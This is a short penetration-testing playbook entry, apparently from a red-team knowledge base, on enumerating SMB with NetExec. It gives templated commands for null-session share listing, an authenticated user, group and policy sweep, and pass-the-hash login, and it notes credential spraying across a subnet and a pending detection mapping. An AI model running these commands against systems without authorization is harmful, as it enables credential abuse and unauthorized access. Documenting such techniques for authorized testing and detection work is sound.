---
id: smb-enum-nxc
title: SMB enum via NetExec (null → authed → pass-the-hash)
section: Netbios-ssn / Microsoft-ds — TCP 139/445 (SMB)
phase: Discovery
attack:
  tactic: TA0007
  techniques: [T1135, T1087.002]
platform: [windows, network]
source: hacktheplanet §"Netbios-ssn / Microsoft-ds — TCP 139/445 (SMB)"
pair: null
pair_note: >-
  Unpaired pending a detection entry, NOT because the technique is undetectable:
  5145 share access and the auth-burst pattern both catch it, and
  dotfiles-Defense carries host_enum_srvsvc_wkssvc_5145.yml already. Tracked in
  dotgibson/htpx#97.
---

Null session first, then an authed sweep. Spraying one credential across the
subnet is bread-and-butter credential reuse. The `-H` form swaps a password for
an NT hash (pass-the-hash). (Pure recon — no paired blue detection.)

```sh
nxc smb {{rhost}} -u '' -p '' --shares
nxc smb {{rhost}} -u {{user}} -p {{password}} --users --groups --shares --pass-pol
nxc smb {{rhost}} -u {{user}} -H {{nthash}}
```
